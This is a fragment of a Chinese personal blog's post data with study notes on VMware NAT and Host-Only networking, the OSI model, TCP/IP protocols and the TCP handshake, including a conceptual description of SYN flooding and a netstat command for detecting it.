alt=\"ubuntu访问kali主页\"></p>\n<p><strong>但如果想要使物理机或局域网甚至外网访问虚拟机，必须在虚拟网络编辑器中设置静态端口映射</strong>，这在上一篇博客中已经写过了</p>\n<h3 id=\"NAT技术类型\"><a href=\"#NAT技术类型\" class=\"headerlink\" title=\"NAT技术类型\"></a>NAT技术类型</h3><p>　　NAT有三种类型：静态NAT(Static NAT)、动态地址NAT(Pooled NAT)、网络地址端口转换NAPT（Port－Level NAT）。</p>\n<pre><code>     根据不同的需要，三种NAT方案各有利弊。</code></pre><p>　　<strong>静态NAT</strong>设置起来是最为简单和最容易实现的一种，内部网络中的每个主机都被永久映射成外部网络中的某个合法的地址。而动态地址NAT则是在外部网络中定义了一系列的合法地址，采用动态分配的方法映射到内部网络。NAPT则是把内部地址映射到外部网络的一个IP地址的不同端口上。根据不同的需要，三种NAT方案各有利弊。</p>\n<p>　　<strong>动态地址NAT</strong>只是转换IP地址，它为每一个内部的IP地址分配一个<strong>临时的外部IP地址</strong>，主要应用于拨号，对于频繁的远程联接也可以采用动态NAT。当远程用户联接上之后，动态地址NAT就会分配给他一个IP地址，用户断开时，这个IP地址就会被释放而留待以后使用。</p>\n<p>　　<strong>网络地址端口转换NAPT</strong>（Network Address Port  Translation）是人们比较熟悉的一种转换方式（也就是上一篇文章写的设置静态端口映射的方式）。NAPT普遍应用于接入设备中，它可以将中小型的网络隐藏在一个合法的IP地址（私有或公有都行）后面。NAPT与动态地址NAT不同，它将内部连接映射到外部网络中的一个<strong>单独的IP地址</strong>上，同时在该地址上加上一个由NAT设备选定的TCP端口号。</p>\n<h2 id=\"Host-Only\"><a href=\"#Host-Only\" class=\"headerlink\" title=\"Host-Only\"></a><strong>Host-Only</strong></h2><p> 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。</p>\n<p>　　Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。</p>\n"},{"layout":"post","title":"现阶段计算机网络知识笔记以及整合（不断整合）","date":"2020-11-20T16:00:00.000Z","description":"一些笼统的计算机网络知识，有疏漏或错误之处等我刷了《计算机网络》以后再回来修改补齐","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# 现阶段计算机网络知识笔记以及整合\n\n\n\n## OSI网络参考模型\n\n**开放式系统互联模型**（英语：**O**pen **S**ystem **I**nterconnection Model，缩写：OSI；简称为**OSI模型**）是一种[概念模型](https://zh.wikipedia.org/wiki/概念模型)，由[国际标准化组织](https://zh.wikipedia.org/wiki/国际标准化组织)提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。定义于ISO/IEC 7498-1。\n\n根据建议X.200，OSI将计算机网络体系结构划分为以下七层，标有1～7，第1层在底部。 现“OSI/RM”是[英文](https://zh.wikipedia.org/wiki/英文)“Open Systems Interconnection Reference Model”的缩写。\n\nPS:这只是一种参考模型\n\n### 第7层 应用层\n\n主条目：[应用层](https://zh.wikipedia.org/wiki/应用层)\n\n应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。\n\n### 第6层 表示层\n\n主条目：[表示层](https://zh.wikipedia.org/wiki/表示层)\n\n表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。\n\n### 第5层 会话层\n\n主条目：[会话层](https://zh.wikipedia.org/wiki/会话层)\n\n会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。\n\n### 第4层 传输层\n\n主条目：[传输层](https://zh.wikipedia.org/wiki/传输层)\n\n传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。\n\n### 第3层 网络层\n\n主条目：[网络层](https://zh.wikipedia.org/wiki/网络层)\n\n网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成报文。网络表头包含了网络资料。例如:互联网协议（IP）等。\n\n### 第2层 数据链路层\n\n主条目：[数据链路层](https://zh.wikipedia.org/wiki/数据链路层)\n\n数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成[信息框](https://zh.wikipedia.org/wiki/資訊框)（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。\n\n分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。\n\n### 第1层 物理层\n\n主条目：[物理层](https://zh.wikipedia.org/wiki/物理层)\n\n物理层（Physical Layer）在局部局域网上传送[数据帧](https://zh.wikipedia.org/wiki/数据帧)（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。\n\n\n\n## TCP/IP协议族\n\nTCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。\n\n里面有：\n\n#### TCP - 传输控制协议\n\nTCP 用于从应用程序到网络的数据传输控制。\n\nTCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。\n\n------\n\n#### IP - 网际协议（Internet Protocol）\n\nIP 负责计算机之间的通信。\n\nIP 负责在因特网上发送和接收数据包。\n\n------\n\n#### HTTP - 超文本传输协议(Hyper Text Transfer Protocol)\n\nHTTP 负责 web 服务器与 web 浏览器之间的通信。\n\nHTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。\n\n------\n\n#### HTTPS - 安全的 HTTP（HTTP Secure）\n\nHTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。\n\n作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。\n\n------\n\n#### SSL - 安全套接字层（Secure Sockets Layer）\n\nSSL 协议用于为安全数据传输加密数据。（TLS协议的前身）\n\n------\n\n#### TLS - 安全传输层协议（Transport Layer Security）\nTLS协议用于在两个通信应用程序之间提供保密性和数据完整性。（标准化SSL协议）\n\n------\n\n#### SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）\n\nSMTP 用于电子邮件的传输。\n\n------\n\n#### MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）\n\nMIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。\n\n------\n\n#### IMAP - 因特网消息访问协议（Internet Message Access Protocol）\n\nIMAP 用于存储和取回电子邮件。\n\n------\n\n#### POP - 邮局协议（Post Office Protocol）\n\nPOP 用于从电子邮件服务器向个人电脑下载电子邮件。\n\n------\n\n#### FTP - 文件传输协议（File Transfer Protocol）\n\nFTP 负责计算机之间的文件传输。\n\n------\n\n#### NTP - 网络时间协议（Network Time Protocol）\n\nNTP 用于在计算机之间同步时间（钟）。\n\n------\n\n#### DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）\n\nDHCP 用于向网络中的计算机分配动态 IP 地址。\n\n------\n\n#### SNMP - 简单网络管理协议（Simple Network Management Protocol）\n\nSNMP 用于计算机网络的管理。\n\n------\n\n#### LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）\n\nLDAP 用于从因特网搜集关于用户和电子邮件地址的信息。\n\n------\n\n#### ICMP - 因特网消息控制协议（Internet Control Message Protocol）\n\nICMP 负责网络中的错误处理。\n\n------\n\n#### ARP - 地址解析协议（Address Resolution Protocol）\n\nARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。\n\n------\n\n#### RARP - 反向地址转换协议（Reverse Address Resolution Protocol）\n\nRARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。\n\n------\n\n#### BOOTP - 自举协议（Boot Protocol）\n\nBOOTP 用于从网络启动计算机。\n\n------\n\n#### PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）\n\nPPTP 用于私人网络之间的连接（隧道）。\n\n\n\n## TCP/IP\n\nTCP/IP 是用于因特网 (Internet) 的通信协议。\n\nTCP/IP 是供已连接因特网的计算机进行通信的通信协议。\n\nTCP/IP 指传输控制协议/网际协议（*T*ransmission *C*ontrol *P*rotocol / *I*nternet *P*rotocol）。\n\nTCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。\n\n### TCP 使用固定的连接\n\nTCP 用于应用程序之间的通信。\n\n当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方\"握手\"之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。\n\n这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。\n\nUDP 和 TCP 很相似，但是更简单，同时可靠性低于 TCP。\n\n### IP 是无连接的\n\nIP 用于计算机之间的通信。\n\nIP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。\n\n通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。\n\nIP 负责将每个包路由至它的目的地。\n\n### **TCP/IP协同而分工工作**\n\nTCP/IP 意味着 TCP 和 IP 在一起协同工作。但他们分工又十分分明，简单来说：\n\nTCP 负责应用软件（比如浏览器）和网络软件之间的通信。\n\nIP 负责计算机之间的通信。\n\nTCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。\n\nIP 负责将包发送至接受者。\n\n#### TCP三次握手、四次挥手\n\n------\n\n- 所谓**三次握手**(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个数据包。\n\n\n\n三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息。\n**第一次握手：**Client向Server发送SYN握手包（seq=x），进入SYN_SEND状态\n**第二次握手：**Server返回SYN+ACK确认包(seq=y,ack=x+1)，进入SYN_RECV状态\n**第三次握手：**Client再次发送ACK确认包(ack=y+1),此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。\n\n完成三次握手，客户端与服务器开始传送数据。\n\n#### 图文详解：\n\n![100327002629](http://www.centos.bz/wp-content/uploads/2012/08/100327002629.png)\n 第一次握手:\n 客户端发送一个TCP的**SYN标志位置为1**的包（表明这是一个**SYN包**）指明客户打算连接的服务器的端口，以及**初始序号X**,保存在包头的序列号(**Seq**uence Number)字段里。\n![100327002911](http://www.centos.bz/wp-content/uploads/2012/08/100327002911.png)\n 第二次握手:\n 服务器发回**SYN+ACK确认包**应答。即**SYN标志位和ACK标志位均为1**同时，将确认序号(**Ack**nowledgement Number)设置为客户的初始序号加1，即X+1。并设置这个SYN+ACK确认包的序列号（seq）为**Y**\n![100327003054](http://www.centos.bz/wp-content/uploads/2012/08/100327003054.png)\n\n第三次握手.\n 客户端发送一个**ACK确认包**（ **SYN标志位为0,ACK标志位为1**）。并且把服务器发来SYN+ACK确认包的序列号（seq）字段+1,放在确认序号字段中发送给对方。\n![100327003214](http://www.centos.bz/wp-content/uploads/2012/08/100327003214.png)\n\n上面这个来回对对方发来的数据包的序列号seq的值+1再作为确认序号发送回去的过程，可以在一定程度上保证信息传递的完整性以及安全。\n\n**SYN攻击**\n   在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态.\n  Syn攻击就是 攻击客户端  在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直 至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。\n Syn攻击是一个典型的[DDOS](https://www.centos.bz/tag/ddos/)攻击。检测SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击.在[Linux](http://www.centos.bz/)下可以如下命令检测是否被Syn攻击\n\n```shell\nnetstat -n -p TCP | grep SYN_RECV\n```\n\n 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改TCP协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.\n 但是不能完全防范SYN攻击。\n\n\n\n- 所谓**四次挥手**(four-way handshake)，是指拆除一个TCP连接时，需要客户端和服务器总共发送4个数据包。\n\n与上面写的三次握手不同的是，客户端或服务器均可主动发起挥手动作。\n\n**第一次挥手：**主动方发送一个FIN，用来关闭主动方到被动方的数据传送\n\n**第二次挥手：**被动方收到这个FIN，它发回一个ACK，确认序号为收到的序号加1\n\n这中间如果被动方还有数据没有发送完毕，可以继续发送，直到完成后，再接着进行第三次挥手（**这也是为什么握手只要三次，挥手却需要四次**）\n\n**第三次挥手：**被动方关闭与主动方的连接，发送一个FIN给主动方\n\n**第四次挥手：**主动方发回ACK报文确认，并将确认序号设置为收到序号加1\n\n![100327022731](http://www.centos.bz/wp-content/uploads/2012/08/100327022731.jpg)\n\n 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改tcp协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.\n 但是不能完全防范syn攻击。\n\n上图有疏漏，最后一个ACK包中的ACK应当等于Y+1。\n\n\n\n## IP地址（IPv4）\n\n每个计算机必须有一个 IP 地址才能够连入因特网。\n\n每个 IP 包必须有一个地址才能够发送到另一台计算机。\n\nTCP/IP 使用 4 组数字（4个数字）来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址（IPv4地址）。\n\n每组数字必须在 0 到 255（就是8位二进制数） 之间，并由点号隔开，比如：192.168.1.60。\n\n所以一个ip地址实际上一个32位的二进制数，每八位用一个点号分开。\n\n### IPv6\n\n下一代ip协议，为了应对IPv4地址日渐消耗殆尽的问题而设计的。暂且不表，因为我还没仔细了解\n\n\n\n## TCP/IP协议四层模型\n\nTCP/IP协议是OSI体系结构的一种实现，但将OSI概念体系中的”会话层，表达层，应用层“合并为”应用层“，传输层和网络层基本不变，又将”数据链路层和物理层“归并成”网络接口层“，使其更简洁，便于实现。\n\n### 链路层\n\n以太网协议规定，接入网络的设备都必须安装网络适配器，即网卡，数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，有了MAC地址以后，[以太网](https://baike.baidu.com/item/以太网/99684)采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。 [4] \n\n所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。 [4] \n\n\n\n### 网络层\n\n**IP协议**\n\n网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。如果两个IP地址在同一个子网内，则网络地址一定相同。为了判断IP地址中的网络地址，IP协议还引入了子网掩码，IP地址和子网掩码通过按位与运算后就可以得到网络地址。 [4] \n\n**ARP协议**\n\n即地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。其工作原理如下：ARP首先会发起一个请求数据包，数据包的首部包含了目标主机的IP地址，然后这个数据包会在链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头里的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回消息，以此确定目标机的MAC地址；与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 [4] \n\n**路由协议**\n\n首先通过IP协议来判断两台主机是否在同一个[子网](https://baike.baidu.com/item/子网/1186929)中，如果在同一个子网，就通过ARP协议查询对应的MAC地址，然后以广播的形式向该子网内的主机发送数据包；如果不在同一个子网，以太网会将该数据包转发给本子网的网关进行路由。[网关](https://baike.baidu.com/item/网关/98992)是[互联网](https://baike.baidu.com/item/互联网/199186)上子网与子网之间的桥梁，所以网关会进行多次转发，最终将该数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给接收方。而完成这个路由协议的物理设备就是[路由器](https://baike.baidu.com/item/路由器/108294)，路由器扮演着交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。 [4] \n\n所以，网络层的主要工作是定义网络地址、区分网段、子网内MAC寻址、对于不同子网的数据包进行路由。 [4] \n\n\n\n### 传输层\n\n链路层定义了主机的身份，即MAC地址，而网络层定义了IP地址，明确了主机所在的[网段](https://baike.baidu.com/item/网段/11026985)，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。因此传输层引入了[UDP](https://baike.baidu.com/item/UDP/571511)协议来解决这个问题，为了给每个应用程序标识身份。\n\n传输层协议负责解决数据传输问题，包括数据通行的可靠性问题。传输层依赖更底层的网络层来完成实际的数据传输，在TCP/IP网络协议中，负责可靠通信的传输层协议为TCP协议。**而网络层一般用网络驱动来实现，普通的程序员不会涉及**；在TCP/IP协议中，网络层的协议为IP协议。\n\n**UDP协议**\n\nUDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。UDP协议比较简单，实现容易，但它没有确认机制，数据包一旦发出，无法知道对方是否收到，因此可靠性较差，为了解决这个问题，提高网络可靠性，TCP协议就诞生了。\n\n**TCP协议**\n\nTCP即传输控制协议，是一种面向连接的、可靠的、基于字节流的通信协议。简单来说TCP就是有确认机制的UDP协议，每发出一个数据包都要求确认，如果有一个数据包丢失，就收不到确认，发送方就必须重发这个数据包。为了保证传输的可靠性，TCP协议在UDP基础之上建立了三次对话的确认机制，即在正式收发数据前，必须和对方建立可靠的连接。TCP数据包和UDP一样，都是由首部和数据两部分组成，唯一不同的是，TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。 [4] \n\n传输层的主要工作是定义[端口](https://baike.baidu.com/item/端口/103505)，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。 [4] \n\n\n\n### 应用层\n\n理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差，因此，应用层定义了各种各样的协议来规范数据格式，常见的有[http](https://baike.baidu.com/item/http/243074),ftp,[smtp](https://baike.baidu.com/item/smtp/175887)等，在请求[Header](https://baike.baidu.com/item/Header/688992)中，分别定义了请求数据格式Accept和响应数据格式Content-Type，有了这个规范以后，当对方接收到请求以后就知道该用什么格式来解析，然后对请求进行处理，最后按照请求方要求的格式将数据返回，请求端接收到响应后，就按照规定的格式进行解读。 [4] \n\n所以应用层的主要工作就是定义数据格式并按照对应的格式解读数据。 [4] ","source":"_posts/2020-11-21-现阶段学习过的计算机网络知识整合笔记.md","raw":"---\nlayout: post\ntitle: 现阶段计算机网络知识笔记以及整合（不断整合）\ndate: 2020-11-21\ncategories: blog\ntags: [web,计算机网络]\ndescription: 一些笼统的计算机网络知识，有疏漏或错误之处等我刷了《计算机网络》以后再回来修改补齐\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# 现阶段计算机网络知识笔记以及整合\n\n\n\n## OSI网络参考模型\n\n**开放式系统互联模型**（英语：**O**pen **S**ystem **I**nterconnection Model，缩写：OSI；简称为**OSI模型**）是一种[概念模型](https://zh.wikipedia.org/wiki/概念模型)，由[国际标准化组织](https://zh.wikipedia.org/wiki/国际标准化组织)提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。定义于ISO/IEC 7498-1。\n\n根据建议X.200，OSI将计算机网络体系结构划分为以下七层，标有1～7，第1层在底部。 现“OSI/RM”是[英文](https://zh.wikipedia.org/wiki/英文)“Open Systems Interconnection Reference Model”的缩写。\n\nPS:这只是一种参考模型\n\n### 第7层 应用层\n\n主条目：[应用层](https://zh.wikipedia.org/wiki/应用层)\n\n应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。\n\n### 第6层 表示层\n\n主条目：[表示层](https://zh.wikipedia.org/wiki/表示层)\n\n表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。\n\n### 第5层 会话层\n\n主条目：[会话层](https://zh.wikipedia.org/wiki/会话层)\n\n会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。\n\n### 第4层 传输层\n\n主条目：[传输层](https://zh.wikipedia.org/wiki/传输层)\n\n传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。\n\n### 第3层 网络层\n\n主条目：[网络层](https://zh.wikipedia.org/wiki/网络层)\n\n网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成报文。网络表头包含了网络资料。例如:互联网协议（IP）等。\n\n### 第2层 数据链路层\n\n主条目：[数据链路层](https://zh.wikipedia.org/wiki/数据链路层)\n\n数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成[信息框](https://zh.wikipedia.org/wiki/資訊框)（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。\n\n分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。\n\n### 第1层 物理层\n\n主条目：[物理层](https://zh.wikipedia.org/wiki/物理层)\n\n物理层（Physical Layer）在局部局域网上传送[数据帧](https://zh.wikipedia.org/wiki/数据帧)（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。\n\n\n\n## TCP/IP协议族\n\nTCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。\n\n里面有：\n\n#### TCP - 传输控制协议\n\nTCP 用于从应用程序到网络的数据传输控制。\n\nTCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。\n\n------\n\n#### IP - 网际协议（Internet Protocol）\n\nIP 负责计算机之间的通信。\n\nIP 负责在因特网上发送和接收数据包。\n\n------\n\n#### HTTP - 超文本传输协议(Hyper Text Transfer Protocol)\n\nHTTP 负责 web 服务器与 web 浏览器之间的通信。\n\nHTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。\n\n------\n\n#### HTTPS - 安全的 HTTP（HTTP Secure）\n\nHTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。\n\n作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。\n\n------\n\n#### SSL - 安全套接字层（Secure Sockets Layer）\n\nSSL 协议用于为安全数据传输加密数据。（TLS协议的前身）\n\n------\n\n#### TLS - 安全传输层协议（Transport Layer Security）\nTLS协议用于在两个通信应用程序之间提供保密性和数据完整性。（标准化SSL协议）\n\n------\n\n#### SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）\n\nSMTP 用于电子邮件的传输。\n\n------\n\n#### MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）\n\nMIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。\n\n------\n\n#### IMAP - 因特网消息访问协议（Internet Message Access Protocol）\n\nIMAP 用于存储和取回电子邮件。\n\n------\n\n#### POP - 邮局协议（Post Office Protocol）\n\nPOP 用于从电子邮件服务器向个人电脑下载电子邮件。\n\n------\n\n#### FTP - 文件传输协议（File Transfer Protocol）\n\nFTP 负责计算机之间的文件传输。\n\n------\n\n#### NTP - 网络时间协议（Network Time Protocol）\n\nNTP 用于在计算机之间同步时间（钟）。\n\n------\n\n#### DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）\n\nDHCP 用于向网络中的计算机分配动态 IP 地址。\n\n------\n\n#### SNMP - 简单网络管理协议（Simple Network Management Protocol）\n\nSNMP 用于计算机网络的管理。\n\n------\n\n#### LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）\n\nLDAP 用于从因特网搜集关于用户和电子邮件地址的信息。\n\n------\n\n#### ICMP - 因特网消息控制协议（Internet Control Message Protocol）\n\nICMP 负责网络中的错误处理。\n\n------\n\n#### ARP - 地址解析协议（Address Resolution Protocol）\n\nARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。\n\n------\n\n#### RARP - 反向地址转换协议（Reverse Address Resolution Protocol）\n\nRARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。\n\n------\n\n#### BOOTP - 自举协议（Boot Protocol）\n\nBOOTP 用于从网络启动计算机。\n\n------\n\n#### PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）\n\nPPTP 用于私人网络之间的连接（隧道）。\n\n\n\n## TCP/IP\n\nTCP/IP 是用于因特网 (Internet) 的通信协议。\n\nTCP/IP 是供已连接因特网的计算机进行通信的通信协议。\n\nTCP/IP 指传输控制协议/网际协议（*T*ransmission *C*ontrol *P*rotocol / *I*nternet *P*rotocol）。\n\nTCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。\n\n### TCP 使用固定的连接\n\nTCP 用于应用程序之间的通信。\n\n当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方\"握手\"之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。\n\n这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。\n\nUDP 和 TCP 很相似，但是更简单，同时可靠性低于 TCP。\n\n### IP 是无连接的\n\nIP 用于计算机之间的通信。\n\nIP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。\n\n通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。\n\nIP 负责将每个包路由至它的目的地。\n\n### **TCP/IP协同而分工工作**\n\nTCP/IP 意味着 TCP 和 IP 在一起协同工作。但他们分工又十分分明，简单来说：\n\nTCP 负责应用软件（比如浏览器）和网络软件之间的通信。\n\nIP 负责计算机之间的通信。\n\nTCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。\n\nIP 负责将包发送至接受者。\n\n#### TCP三次握手、四次挥手\n\n------\n\n- 所谓**三次握手**(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个数据包。\n\n\n\n三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息。\n**第一次握手：**Client向Server发送SYN握手包（seq=x），进入SYN_SEND状态\n**第二次握手：**Server返回SYN+ACK确认包(seq=y,ack=x+1)，进入SYN_RECV状态\n**第三次握手：**Client再次发送ACK确认包(ack=y+1),此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。\n\n完成三次握手，客户端与服务器开始传送数据。\n\n#### 图文详解：\n\n![100327002629](http://www.centos.bz/wp-content/uploads/2012/08/100327002629.png)\n 第一次握手:\n 客户端发送一个TCP的**SYN标志位置为1**的包（表明这是一个**SYN包**）指明客户打算连接的服务器的端口，以及**初始序号X**,保存在包头的序列号(**Seq**uence Number)字段里。\n![100327002911](http://www.centos.bz/wp-content/uploads/2012/08/100327002911.png)\n 第二次握手:\n 服务器发回**SYN+ACK确认包**应答。即**SYN标志位和ACK标志位均为1**同时，将确认序号(**Ack**nowledgement Number)设置为客户的初始序号加1，即X+1。并设置这个SYN+ACK确认包的序列号（seq）为**Y**\n![100327003054](http://www.centos.bz/wp-content/uploads/2012/08/100327003054.png)\n\n第三次握手.\n 客户端发送一个**ACK确认包**（ **SYN标志位为0,ACK标志位为1**）。并且把服务器发来SYN+ACK确认包的序列号（seq）字段+1,放在确认序号字段中发送给对方。\n![100327003214](http://www.centos.bz/wp-content/uploads/2012/08/100327003214.png)\n\n上面这个来回对对方发来的数据包的序列号seq的值+1再作为确认序号发送回去的过程，可以在一定程度上保证信息传递的完整性以及安全。\n\n**SYN攻击**\n   在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态.\n  Syn攻击就是 攻击客户端  在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直 